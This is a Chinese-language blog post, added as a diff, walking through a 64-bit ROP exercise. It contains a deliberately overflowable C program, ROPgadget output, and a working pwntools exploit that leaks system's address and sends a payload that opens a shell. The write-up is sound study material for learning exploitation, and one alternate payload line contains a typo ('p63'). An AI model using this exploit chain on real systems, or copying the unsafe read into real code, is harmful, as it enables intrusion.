@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>rop64 | Tower</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="学rop之64篇出自蒸米哥的rop我这里只是理解http://www.vuln.cn/6644 源码：12345678910111213141516171819202122#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;void systemaddr(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rop64">
+<meta property="og:url" content="http://yoursite.com/2018/05/27/rop64/index.html">
+<meta property="og:site_name" content="Tower">
+<meta property="og:description" content="学rop之64篇出自蒸米哥的rop我这里只是理解http://www.vuln.cn/6644 源码：12345678910111213141516171819202122#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;void systemaddr(">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2018/05/27/rop64/rop_64/image0005.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/27/rop64/rop_64/image0006.png">
+<meta property="og:updated_time" content="2018-08-21T09:56:31.633Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="rop64">
+<meta name="twitter:description" content="学rop之64篇出自蒸米哥的rop我这里只是理解http://www.vuln.cn/6644 源码：12345678910111213141516171819202122#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;void systemaddr(">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/27/rop64/rop_64/image0005.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <!-- <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'> -->
+  <!-- <link href="//fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css"> -->
+  <link href="//fonts.useso.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+  <link href='//fonts.useso.com/css?family=Open+Sans:300,600' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <a href="/" class="logo">Tower</a>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about/index.html">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        </div>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        
+        
+          <a id="nav-github-link" class="nav-icon" href="https://tower111.github.io/" title="Fork me on GitHub"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <nav id="mobile-nav" class="off">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/index.html" class="mobile-nav-link">About</a>
+  
+  <div id="search-form-wrap-mobile">
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+  </div>
+</nav>
+      <div class="outer">
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/08/21/通用gatget/">通用gatget</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/rop32/">rop32</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/free/">free</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/27/rop64/">rop64</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://github.com/tower111/tower111.github.io.git">Hexo</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+        <section id="main"><article id="post-rop64" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/27/rop64/" class="article-date">
+  <time datetime="2018-05-27T13:07:55.000Z" itemprop="datePublished">2018-05-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      rop64
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="学rop之64篇"><a href="#学rop之64篇" class="headerlink" title="学rop之64篇"></a>学rop之64篇</h1><p>出自蒸米哥的rop我这里只是理解<code>http://www.vuln.cn/6644</code></p>
+<p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line"></span><br><span class="line">void systemaddr()</span><br><span class="line">&#123;</span><br><span class="line">    void* handle = dlopen(&quot;libc6_2.27-3ubuntu1_amd64.so&quot;, RTLD_LAZY);</span><br><span class="line">    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));</span><br><span class="line">    fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 512);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(1, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure></p>
+<p>这里只开启可NX保护。<br>64位和32位一个很大的区别是64位是用寄存器传参的。现在已经有system函数的地址了，接下来只需要传入参数/bin/sh就行了。<br>/bin/sh可以直接输入也可以搜索到。不过重要的是需要用一个pop rdi来传参。<br>我们需要赵的是pop rdi; ret;或者是pop rax;pop rdi;call rax;<br>这一类的都能满足要求。<br><img src="rop_64/image0005.png" alt="image0005"><br>可以看出来pop rdi是满足不了的(并没有搜索到)。<br> 那就只能试一下第二个行不行了<br> <img src="rop_64/image0006.png" alt="image0006"><br> 很遗憾的发现也没有那就只能试试libc.so.6中有没有了。<br> 补充一下缺少dll连接库可以用database工具来查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">liu@liu-F117-F:~/softword/tools/libc-database-master/libc-database-master$ ./find system 0x7f2eea1d4440</span><br><span class="line">http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)</span><br></pre></td></tr></table></figure>
+<p>这样就找到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">liu@liu-F117-F:~/桌面$ ROPgadget --binary libc6_2.27-3ubuntu1_amd64.so --only &quot;pop|ret&quot;|grep rdi</span><br><span class="line">0x00000000000221a3 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x000000000002155f : pop rdi ; ret</span><br><span class="line">0x000000000005b4fd : pop rdi ; ret 0x38</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&quot;libc6_2.27-3ubuntu1_amd64.so&quot;)</span><br><span class="line">p=process(&quot;./level4&quot;)</span><br><span class="line">elf=ELF(&quot;level4&quot;)</span><br><span class="line">system_addr=int(p.recvuntil(&apos;\n&apos;),16)</span><br><span class="line">print &quot;bin_sh_addr=&quot;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc_system_offset=libc.symbols[&quot;system&quot;]</span><br><span class="line">bin_sh_addr=system_addr-libc_system_offset+next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">print &quot;bin_sh_addr=&quot;+hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">libc_pr_offset=0x000000000002155f</span><br><span class="line">pr_addr=system_addr-libc_system_offset+libc_pr_offset</span><br><span class="line">print &quot;pr_addr=&quot;+hex(pr_addr)</span><br><span class="line">p.recvuntil(&quot;ld&quot;)</span><br><span class="line">payload=&apos;\x00&apos;*136+p64(pr_addr)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>payload=’\x00’*136+p64(pr_addr)+p64(bin_sh_addr)+p64(system_addr)<br>程序中也能查到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">liu@liu-F117-F:~/桌面$ ROPgadget --binary libc6_2.27-3ubuntu1_amd64.so --only &quot;pop|pop|pop|call&quot;|grep rdi</span><br><span class="line">0x00000000001be293 : call qword ptr [rax + rdi*2 - 0x4c0000]</span><br><span class="line">0x00000000001b017f : call qword ptr [rdi]</span><br><span class="line">0x000000000002529a : call rdi</span><br><span class="line">0x000000000012188b : pop rax ; pop rdi ; call rax</span><br><span class="line">0x000000000012188c : pop rdi ; call rax</span><br></pre></td></tr></table></figure></p>
+<p>我们也可以构造payload=’A’*136+p64(ppr_addr)+p63(1)+p64(bin_sh_addr)+p64(system_addr)</p>
+<hr>
+<p>我们找到一条gadget真的不容易，那么能不能找到一条通用的gadget呢<br>那就看下一篇吧</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/27/rop64/" data-id="cjl3k1by90002iml32p9doabe" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/08/21/free/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          free
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <a href="/" class="logo">Tower</a>
+      &copy; 2018 tower<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.scrollLoading.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
